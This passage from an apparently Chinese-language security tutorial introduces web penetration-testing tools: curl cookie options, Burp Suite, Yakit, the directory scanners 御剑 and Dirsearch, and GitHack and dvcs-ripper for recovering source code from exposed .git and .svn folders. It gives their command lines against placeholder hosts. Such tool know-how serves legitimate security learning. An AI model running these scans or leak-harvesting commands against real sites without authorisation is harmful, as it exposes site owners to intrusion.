class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">curl <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;name=xxx&quot;</span> www<span class="hljs-selector-class">.example</span>.com<br></code></pre></td></tr></table></figure><p>至于具体的cookie的值，可以从http response头信息的`Set-Cookie`字段中得到。</p><p>`-c cookie-file`可以保存服务器返回的cookie到文件，`-b cookie-file`可以使用这个文件作为cookie信息，进行后续的请求。</p><p>保存服务器返回的Cookie信息：命令行处于哪一个目录，Cookie文件就会保存在哪</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">curl -c cookies<span class="hljs-selector-class">.txt</span> http:<span class="hljs-comment">//example.com</span><br></code></pre></td></tr></table></figure><p>向服务器发送Cookie：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">curl</span> -b <span class="hljs-string">&#x27;name=重庆森林不在重庆;passwd=P<span class="hljs-variable">@ssW0rd</span>&#x27;</span> http://example.com<br></code></pre></td></tr></table></figure><p> 或者直接读取本地文件中的Cookie去发送</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">curl -<span class="hljs-selector-tag">b</span> cookie<span class="hljs-selector-class">.txt</span> http:<span class="hljs-comment">//example.com</span><br></code></pre></td></tr></table></figure><h2 id="Burpsuite"><a href="#Burpsuite" class="headerlink" title="Burpsuite"></a><strong>Burpsuite</strong></h2><p>参考文献：</p><p><a href="https://portswigger.net/burp/documentation/desktop/getting-started" title="Getting started with Burp Suite Professional &#x2F; Community Edition - PortSwigger">Getting started with Burp Suite Professional &#x2F; Community Edition - PortSwigger</a></p><p><a href="https://blog.csdn.net/weixin_62808713/article/details/128719786" title="BurpSuite超详细安装教程-功能概述-配置-使用教程---(附下载链接)">BurpSuite超详细安装教程-功能概述-配置-使用教程—(附下载链接)</a></p><h3 id="0x01-介绍-2"><a href="#0x01-介绍-2" class="headerlink" title="0x01 介绍"></a><strong>0x01 介绍</strong></h3><p><strong>BurpSuite是渗透测试、漏洞挖掘以及Web应用程序测试的最佳工具之一，是一款用于攻击web 应用程序的集成攻击测试平台，可以进行抓包、重放、爆破，包含许多工具，能处理对应的HTTP消息、持久性、认证、代理、日志、警报。</strong></p><h3 id="0x02-简单了解"><a href="#0x02-简单了解" class="headerlink" title="0x02 简单了解"></a><strong>0x02</strong> <strong>简单了解</strong></h3><p><strong>尽量在实际例子中学习bp的应用，本文仅仅是简单了解，若要深度学习，请移步作者的其他文章，在实际应用学习bp。</strong></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022007524.png">​​</p><ol><li>Target(目标)——显示目标目录结构的的一个功能</li><li>Proxy(代理)——拦截HTTP&#x2F;S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截、查看、修改在两个方向上的原始数据流。</li><li>Spider(蜘蛛)——应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。</li><li>Scanner(扫描器)——高级工具，执行后，它能自动地发现web 应用程序的安全漏洞（需要付费的专业版才有此功能）。</li><li>Intruder(入侵)——一个定制的高度可配置的工具，对web应用程序进行<strong>自动化攻击</strong>，如：枚举标识符，收集有用的数据，以及使用fuzzing 技术探测常规漏洞。</li><li>Repeater(中继器)——一个靠手动操作来触发单独的HTTP 请求，并分析应用程序响应的工具。</li><li>Sequencer(会话)——用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。</li><li>Decoder(解码器)——进行手动执行或对应用程序数据者智能<strong>解码编码</strong>的工具。</li><li>Comparer(对比)——通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。</li><li>Extender(扩展)——可以让你<strong>加载Burp Suite的扩展</strong>，使用你自己的或第三方代码来扩展Burp Suit的功能。</li><li>Options(设置)——对Burp Suite的一些设置。</li></ol><p>注意：bp最好配合浏览器的扩展插件使用，这样就可以快速代理拦截，具体请见参考文章的第二篇</p><h2 id="Yakit"><a href="#Yakit" class="headerlink" title="Yakit"></a>Yakit</h2><p>参考文献：</p><p><a href="https://yaklang.com/products/intro/" title="Yakit: 集成化单兵安全能力平台 | Yak Program Language">Yakit: 集成化单兵安全能力平台 | Yak Program Language</a>（官方手册）</p><h3 id="0x01-介绍-3"><a href="#0x01-介绍-3" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h3><p>众所周知，<a href="https://zhida.zhihu.com/search?content_id=235807661&content_type=Article&match_order=1&q=BurpSuite&zhida_source=entity" title="BurpSuite">BurpSuite</a>几乎成为全球WEB安全从业者必用的安全测试工具，然而十余年来几乎无一个可替代的解决方案。但破解版被投毒风险高、商业版太贵、插件难写、依赖java…等等问题逐渐显露。</p><p>问题的逐渐显现，使得全球”苦bp久矣“，挑战者也逐渐出现。而Yakit就是最有力的挑战者之一，且是国产的。</p><p><code>Yakit</code> 简单来讲就是一个安全平台，平台里支持很多功能模块(<code>渗透测试、资产搜集、漏洞检测、反连管理</code>等)，是一款非常优秀强悍的<a href="https://so.csdn.net/so/search?q=%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7&spm=1001.2101.3001.7020" title="安全测试工具">安全测试工具</a></p><p>而且由于是国产的，其官方手册及UI界面以汉语为主，更便于理解和操作。</p><h3 id="0x02-使用-2"><a href="#0x02-使用-2" class="headerlink" title="0x02 使用"></a>0x02 使用</h3><p>这里官方手册就是汉语写的，作者就不关公面前耍大刀了，不过其中专业术语较多，大家使用时要有一定基础。</p><h2 id="御剑"><a href="#御剑" class="headerlink" title="御剑"></a>御剑</h2><p>参考文献：</p><p><a href="https://blog.csdn.net/hackzkaq/article/details/110053457" title="后台扫描工具 - 御剑（珍藏版）附下载_御剑后台-CSDN博客">后台扫描工具 - 御剑（珍藏版）附下载_御剑后台-CSDN博客</a></p><h3 id="0x01-介绍-4"><a href="#0x01-介绍-4" class="headerlink" title="0x01 介绍"></a><strong>0x01</strong> <strong>介绍</strong></h3><p>御剑后台扫描珍藏版是T00LS大牛的作品，方便查找用户后台登陆地址。御剑附带很强大的字典，字典我们也是可以自己修改的，可以继续增加规则。</p><p>基础规则：</p><p>1、扫描线程自定义:用户可根据自身电脑的配置来设置调节扫描线程</p><p>2、集合DIR扫描 ASP ASPX PHP JSP MDB数据库 包含所有网站脚本路径扫描</p><p>3、默认探测200 (也就是扫描的网站真实存在的路径文件)</p><h3 id="0x02-使用-3"><a href="#0x02-使用-3" class="headerlink" title="0x02 使用"></a><strong>0x02</strong> <strong>使用</strong></h3><p>御剑的图形化界面做的很好，多看多尝试就能上手，这里不多赘述。</p><p>如何给御剑字典增加新规则？</p><p>相信大家都知道，有时候御剑自带的字典规则并不能完全的满足我们，因此我们需要手工增加字典规则。</p><p>具体步骤如下：</p><p>1、打开 “自己的目录\御剑系列工具\御剑后台扫描珍藏版\配置文件”或“自己的目录\御剑系列工具\御剑后台扫描2\御剑配置文件”。</p><p>2、打开”PHP.txt”。</p><p>这里主要是以PHP程序的后台配置为主，在此文件你完全可以增加一些其它的PHP类型的后台名字。如果你还想修改ASP、ASPX、JSP等，同理。                 </p><h2 id="Dirsearch"><a href="#Dirsearch" class="headerlink" title="Dirsearch"></a>Dirsearch</h2><p>参考文献：</p><p><a href="https://blog.csdn.net/2301_77485708/article/details/132472189" title="【网络安全 | 渗透工具】Dirsearch安装使用教程详析-CSDN博客">【网络安全 | 渗透工具】Dirsearch安装使用教程详析-CSDN博客</a></p><p><a href="https://blog.csdn.net/m0_48574718/article/details/129244162" title="dirsearch使用教程_dirsearch的使用方法-CSDN博客">dirsearch使用教程_dirsearch的使用方法-CSDN博客</a></p><h3 id="0x01-介绍-5"><a href="#0x01-介绍-5" class="headerlink" title="0x01 介绍"></a><strong>0x01 介绍</strong></h3><p>Dirsearch 是一个用于<strong>探测Web服务器上的隐藏目录和文件的工具</strong>（和御剑功能相似）。它通过发送HTTP请求来尝试访问可能存在的路径，从而找到不列在网站目录页面上的隐藏资源，是和御剑同类型的工具，都是目录扫描工具，往往用于信息搜集。</p><p>Dirsearch 的主要特点包括：</p><p>    1.多线程：Dirsearch 采用多线程方式进行目录扫描，充分利用系统资源提高扫描效率。</p><p>    2.字典支持：它支持使用自定义字典文件来进行目录爆破，你可以使用自己的字典文件或使用内置的常用字典。（注：字典必须是文本文件）</p><p>    3.支持多种形式的网页（asp，php）</p><p>    4.支持HTTP代理</p><p>    5.启发式检测无效的网页</p><p>    6.指定扩展名：你可以选择限制扫描的文件扩展名范围，以便更加精确地进行目录扫描。</p><p>    7.进度追踪：Dirsearch 提供实时进度追踪，你可以看到当前扫描的进度和已发现的目录和文件。</p><p>    8.结果输出：完成扫描后，Dirsearch 会生成详细的扫描报告（纯文本，JSON），展示已发现的隐藏目录和文件。</p><h3 id="0x02-使用-4"><a href="#0x02-使用-4" class="headerlink" title="0x02 使用"></a><strong>0x02</strong> <strong>使用</strong></h3><p><strong>1 常用使用方式</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">python dirsearch.py -u http:<span class="hljs-regexp">//</span>xxxx        <span class="hljs-regexp">//</span>常规使用<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">python dirsearch.py -u http:<span class="hljs-regexp">//</span>xxxx -r        <span class="hljs-regexp">//</span>递归扫描，不过容易被检测<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">python dirsearch.py -u http:<span class="hljs-regexp">//</span>xxxx -r -t <span class="hljs-number">30</span>        <span class="hljs-regexp">//</span>线程控制请求速率<br></code></pre></td></tr></table></figure><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">python dirsearch.py -u http:<span class="hljs-string">//xxxx</span> -r -t 30 <span class="hljs-params">--proxy</span> 127.0.0.1<span class="hljs-function">:8080</span>        <span class="hljs-string">//</span>使用代理<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022008924.png">​​</p><p><strong>2 详细使用方式（由dirsearch –help翻译而成）</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">用法：dirsearch.py [-u|<span class="hljs-comment">--url] 目标 [-e|--extensions] 扩展名 [选项]</span><br> <br>选项:<br> <br>  <span class="hljs-comment">--version             显示程序的版本号并退出</span><br> <br>  -h, <span class="hljs-comment">--help            显示此帮助消息并退出</span><br> <br> <br>必需：<br> <br>  -u URL, <span class="hljs-comment">--url=URL     目标URL，可以使用多个选项指定多个目标URL</span><br> <br>  -l <span class="hljs-type">PATH</span>, <span class="hljs-comment">--urls-file=PATH</span><br> <br>                        URL列表文件<br> <br>  <span class="hljs-comment">--stdin               从标准输入读取URL</span><br> <br>  <span class="hljs-comment">--cidr=CIDR           目标CIDR</span><br> <br>  <span class="hljs-comment">--raw=PATH            从文件加载原始HTTP请求（使用&#x27;--scheme&#x27;标志设置方案）</span><br> <br>  -s SESSION_FILE, <span class="hljs-comment">--session=SESSION_FILE</span><br> <br>                        会话文件<br> <br>  <span class="hljs-comment">--config=PATH         配置文件路径（默认为&#x27;DIRSEARCH_CONFIG&#x27;环境变量，否则为&#x27;config.ini&#x27;）</span><br> <br> <br>字典设置:<br> <br>  -w WORDLISTS, <span class="hljs-comment">--wordlists=WORDLISTS</span><br> <br>                        单词列表文件或包含单词列表文件的目录（以逗号分隔）<br> <br>  -e EXTENSIONS, <span class="hljs-comment">--extensions=EXTENSIONS</span><br> <br>                        扩展名列表，以逗号分隔（例如：php,asp）<br> <br>  -f, <span class="hljs-comment">--force-extensions</span><br> <br>                        在每个单词列表条目的末尾添加扩展名。默认情况下，dirsearch只替换%EXT%关键字为扩展名。<br> <br>  -O, <span class="hljs-comment">--overwrite-extensions</span><br> <br>                        使用指定的扩展名覆盖单词列表中的其他扩展名（通过<span class="hljs-string">&#x27;-e&#x27;</span>选择）<br> <br>  <span class="hljs-comment">--exclude-extensions=EXTENSIONS</span><br> <br>                        排除的扩展名列表，以逗号分隔（例如：asp,jsp）<br> <br>  <span class="hljs-comment">--remove-extensions   删除所有路径中的扩展名（例如：admin.php -&gt; admin）</span><br> <br>  <span class="hljs-comment">--prefixes=PREFIXES   将自定义前缀添加到所有单词列表条目中（以逗号分隔）</span><br> <br>  <span class="hljs-comment">--suffixes=SUFFIXES   将自定义后缀添加到所有单词列表条目中，忽略目录（以逗号分隔）</span><br> <br>  -U, <span class="hljs-comment">--uppercase       单词列表转为大写</span><br> <br>  -L, <span class="hljs-comment">--lowercase       单词列表转为小写</span><br> <br>  -C, <span class="hljs-comment">--capital         单词首字母大写</span><br> <br> <br>通用设置:<br> <br>  -t THREADS, <span class="hljs-comment">--threads=THREADS</span><br> <br>                        线程数<br> <br>  -r, <span class="hljs-comment">--recursive       递归地进行强制破解</span><br> <br>  <span class="hljs-comment">--deep-recursive      在每个目录深度上执行递归扫描（例如：api/users -&gt; api/）</span><br> <br>  <span class="hljs-comment">--force-recursive     对找到的每个路径执行递归强制破解，而不仅仅是目录</span><br> <br>  -R DEPTH, <span class="hljs-comment">--max-recursion-depth=DEPTH</span><br> <br>                        最大递归深度<br> <br>  <span class="hljs-comment">--recursion-status=CODES</span><br> <br>                        用于执行递归扫描的有效状态码，支持范围（以逗号分隔）<br> <br>  <span class="hljs-comment">--subdirs=SUBDIRS     扫描给定URL的子目录（以逗号分隔）</span><br> <br>  <span class="hljs-comment">--exclude-subdirs=SUBDIRS</span><br> <br>                        在递归扫描期间排除以下子目录（以逗号分隔）<br> <br>  -i CODES, <span class="hljs-comment">--include-status=CODES</span><br> <br>                        包括的状态码，以逗号分隔，支持范围（例如：<span class="hljs-number">200</span>,<span class="hljs-number">300</span><span class="hljs-number">-399</span>）<br> <br>  -x CODES, <span class="hljs-comment">--exclude-status=CODES</span><br> <br>                        排除的状态码，以逗号分隔，支持范围（例如：<span class="hljs-number">301</span>,<span class="hljs-number">500</span><span class="hljs-number">-599</span>）<br> <br>  <span class="hljs-comment">--exclude-sizes=SIZES</span><br> <br>                        根据大小排除响应，以逗号分隔（例如：<span class="hljs-number">0</span>B,<span class="hljs-number">4</span>KB）<br> <br>  <span class="hljs-comment">--exclude-text=TEXTS  根据文本排除响应，可以使用多个标志</span><br> <br>  <span class="hljs-comment">--exclude-regex=REGEX</span><br> <br>                        根据正则表达式排除响应<br> <br>  <span class="hljs-comment">--exclude-redirect=STRING</span><br> <br>                        如果此正则表达式（或文本）与重定向URL匹配，则排除响应（例如：<span class="hljs-string">&#x27;/index.html&#x27;</span>）<br> <br>  <span class="hljs-comment">--exclude-response=PATH</span><br> <br>                        排除类似于此页面响应的响应，路径作为输入（例如：<span class="hljs-number">404.</span>html）<br> <br>  <span class="hljs-comment">--skip-on-status=CODES</span><br> <br>                        每当命中这些状态码之一时跳过目标，以逗号分隔，支持范围<br> <br>  <span class="hljs-comment">--min-response-size=LENGTH</span><br> <br>                        响应的最小长度<br> <br>  <span class="hljs-comment">--max-response-size=LENGTH</span><br> <br>                        响应的最大长度<br> <br>  <span class="hljs-comment">--max-time=SECONDS    扫描的最大运行时间</span><br> <br>  <span class="hljs-comment">--exit-on-error       发生错误时退出</span><br> <br> <br>请求设置:<br> <br>  -m <span class="hljs-keyword">METHOD</span>, <span class="hljs-comment">--http-method=METHOD</span><br> <br>                        HTTP请求方法（默认为<span class="hljs-keyword">GET</span>）<br> <br>  -d DATA, <span class="hljs-comment">--data=DATA  HTTP请求数据</span><br> <br>  <span class="hljs-comment">--data-file=PATH      包含HTTP请求数据的文件</span><br> <br>  -H HEADERS, <span class="hljs-comment">--header=HEADERS</span><br> <br>                        HTTP请求标头，可以使用多个标志<br> <br>  <span class="hljs-comment">--headers-file=PATH   包含HTTP请求标头的文件</span><br> <br>  -F, <span class="hljs-comment">--follow-redirects</span><br> <br>                        跟随HTTP重定向<br> <br>  <span class="hljs-comment">--random-agent        每个请求选择一个随机User-Agent</span><br> <br>  <span class="hljs-comment">--auth=CREDENTIAL     认证凭据（例如：user:password或bearer token）</span><br> <br>  <span class="hljs-comment">--auth-type=TYPE      认证类型（basic、digest、bearer、ntlm、jwt）</span><br> <br>  <span class="hljs-comment">--cert-file=PATH      包含客户端证书的文件</span><br> <br>  <span class="hljs-comment">--key-file=PATH       包含客户端证书私钥的文件（未加密）</span><br> <br>  <span class="hljs-comment">--user-agent=USER_AGENT</span><br> <br>  <span class="hljs-comment">--cookie=COOKIE</span><br> <br> <br>连接设置:<br> <br>  <span class="hljs-comment">--timeout=TIMEOUT     连接超时时间</span><br> <br>  <span class="hljs-comment">--delay=DELAY         请求之间的延迟</span><br> <br>  -p PROXY, <span class="hljs-comment">--proxy=PROXY</span><br> <br>                        代理URL（HTTP/SOCKS），可以使用多个标志<br> <br>  <span class="hljs-comment">--proxies-file=PATH   包含代理服务器的文件</span><br> <br>  <span class="hljs-comment">--proxy-auth=CREDENTIAL</span><br> <br>                        代理认证凭据<br> <br>  <span class="hljs-comment">--replay-proxy=PROXY  用于重放已发现路径的代理</span><br> <br>  <span class="hljs-comment">--tor                 使用Tor网络作为代理</span><br> <br>  <span class="hljs-comment">--scheme=SCHEME       原始请求的协议或URL中没有协议时使用的协议（默认为自动检测）</span><br> <br>  <span class="hljs-comment">--max-rate=RATE       每秒请求数最大值</span><br> <br>  <span class="hljs-comment">--retries=RETRIES     失败请求的重试次数</span><br> <br>  <span class="hljs-comment">--ip=IP               服务器IP地址</span><br> <br> <br>高级设置:<br> <br>  <span class="hljs-comment">--crawl               在响应中爬取新路径</span><br> <br> <br>显示设置:<br> <br>  <span class="hljs-comment">--full-url            在输出中显示完整URL（在静默模式下自动启用）</span><br> <br>  <span class="hljs-comment">--redirects-history   显示重定向历史记录</span><br> <br>  <span class="hljs-comment">--no-color            不使用彩色输出</span><br> <br>  -q, <span class="hljs-comment">--quiet-mode      安静模式</span><br> <br> <br>输出设置:<br> <br>  -o <span class="hljs-type">PATH</span>/URL, <span class="hljs-comment">--output=PATH/URL</span><br> <br>                        输出文件或MySQL/PostgreSQL数据库URL（格式：<br> <br>                        scheme://[username:<span class="hljs-keyword">password</span>@]host[:port]/<span class="hljs-keyword">database</span>-<br> <br>                        <span class="hljs-type">name</span>）<br> <br>  <span class="hljs-comment">--format=FORMAT       报告格式（可用：simple、plain、json、xml、md、csv、html、</span><br> <br>                        sqlite、mysql、postgresql）<br> <br>  <span class="hljs-comment">--log=PATH            日志文件</span><br> <br> <br>有关示例配置文件，请参见“config.ini”<br></code></pre></td></tr></table></figure><h2 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h2><p><a href="https://nulab.com/zh-cn/learn/software-development/git-tutorial/how-to-use-git/manage-history/" title="如何在 Git 中管理历史记录 | Git tutorial | Nulab">如何在 Git 中管理历史记录 | Git tutorial | Nulab</a>（官方教程）</p><h3 id="0x01-介绍-6"><a href="#0x01-介绍-6" class="headerlink" title="0x01 介绍"></a><strong>0x01</strong> <strong>介绍</strong></h3><p>Git 是一个用于管理源代码的分布式版本控制系统。版本控制系统会在您修改文件时记录并保存更改，使您可以随时恢复以前的工作版本。</p><p><strong>简单来说，git就是便于多人一起编程的一个管理工具（把一个大任务分成许多个小的，然后分配给不同的人就是分布式）</strong></p><p>像 Git 这样的版本控制系统可以很容易地</p><ul><li>跟踪代码历史记录</li><li>以团队形式协作编写代码</li><li>查看谁做了哪些更改</li></ul><h3 id="0x02-使用-5"><a href="#0x02-使用-5" class="headerlink" title="0x02 使用"></a><strong>0x02</strong> <strong>使用</strong></h3><p><strong>git的使用讲解需较大篇幅，本文不进行展开，具体内容可以参考官方教程</strong></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022008988.jpeg">​​</p><h2 id="GitHack"><a href="#GitHack" class="headerlink" title="GitHack"></a><strong>GitHack</strong></h2><h3 id="0x01-介绍-7"><a href="#0x01-介绍-7" class="headerlink" title="0x01 介绍"></a><strong>0x01</strong> <strong>介绍</strong></h3><p>GitHack是一个.git泄露利用脚本，通过泄露的.git文件夹下的文件，重建还原工程源代码。渗透测试人员、攻击者，可以进一步审计代码，挖掘文件上传，SQL注入等web安全漏洞。</p><p><strong>简单来说，利用git多人协作的时候，可能会有有用的信息泄露，githack就是专门找到并且下载这些信息的。</strong></p><h3 id="0x02-使用-6"><a href="#0x02-使用-6" class="headerlink" title="0x02 使用"></a><strong>0x02</strong> <strong>使用</strong></h3><p><strong>（作者是在kali中使用）</strong></p><p>进入githack的目录下，在这里打开终端</p><p>使用以下代码去下载文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python2 githack.py URL/.git<br></code></pre></td></tr></table></figure><p>对文件进行再分析</p><h2 id="dvcs-ripper"><a href="#dvcs-ripper" class="headerlink" title="dvcs-ripper"></a><strong>dvcs-ripper</strong></h2><p>参考文献</p><p><a href="https://blog.csdn.net/Barlow_121212/article/details/120491567" title="dvcs-ripper安装教程-CSDN博客">dvcs-ripper安装教程-CSDN博客</a></p><h3 id="0x01-介绍-8"><a href="#0x01-介绍-8" class="headerlink" title="0x01 介绍"></a><strong>0x01</strong> <strong>介绍</strong></h3><p>针对SVN泄露的工具——dvcs-ripper。</p><p>（当然不仅仅只有SVN，还可访问分布式版本控制系统：GIT、Mercurial&#x2F;hg、bzr、…）</p><h3 id="0x02-使用-7"><a href="#0x02-使用-7" class="headerlink" title="0x02 使用"></a><strong>0x02</strong> <strong>使用</strong></h3><p>1、运行示例（用于 git）：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">rip-git.pl -v -u http:<span class="hljs-regexp">//</span>www.example.com<span class="hljs-regexp">/.git/</span><br></code></pre></td></tr></table></figure><p>It will automatically do<br><code>git checkout -f</code>  </p><p>它会自动执行 <code>git checkout -f</code></p><p>or if you would like to ignore SSL certification verification (with -s):<br>或者，如果您想忽略 SSL 证书验证（带 -s）：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">rip-git.pl -s -v -u http:<span class="hljs-regexp">//</span>www.example.com<span class="hljs-regexp">/.git/</span><br></code></pre></td></tr></table></figure><p>2、运行示例（针对 hg）：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">rip-hg.pl -v -u http:<span class="hljs-regexp">//</span>www.example.com<span class="hljs-regexp">/.hg/</span><br></code></pre></td></tr></table></figure><p>It will automatically do <code>hg revert</code>  </p><p>它会自动执行 <code>hg revert</code></p><p>or if you would like to ignore SSL certification verification (with -s):  </p><p>或者，如果您想忽略 SSL 证书验证（带 -s）：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">rip-hg.pl -s -v -u http:<span class="hljs-regexp">//</span>www.example.com<span class="hljs-regexp">/.hg/</span><br></code></pre></td></tr></table></figure><p>3、运行示例（用于 bzr）：(前面要有.&#x2F;)</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">rip-bzr.pl -v -u http:<span class="hljs-regexp">//</span>www.example.com<span class="hljs-regexp">/.bzr/</span><br></code></pre></td></tr></table></figure><p>It will automatically do <code>bzr revert</code>  </p><p>它会自动执行 <code>bzr revert</code></p><p>or if you would like to ignore SSL certification verification (with -s):  </p><p>或者，如果您想忽略 SSL 证书验证（带 -s）：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">rip-bzr.pl -s -v -u http:<span class="hljs-regexp">//</span>www.example.com<span class="hljs-regexp">/.bzr/</span><br></code></pre></td></tr></table></figure><p>4、运行示例（适用于SVN）：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">rip-svn.pl -v -u http:<span class="hljs-regexp">//</span>www.example.com<span class="hljs-regexp">/.svn/</span><br></code></pre></td></tr></table></figure><p>It will automatically do <code>svn revert -R .</code>  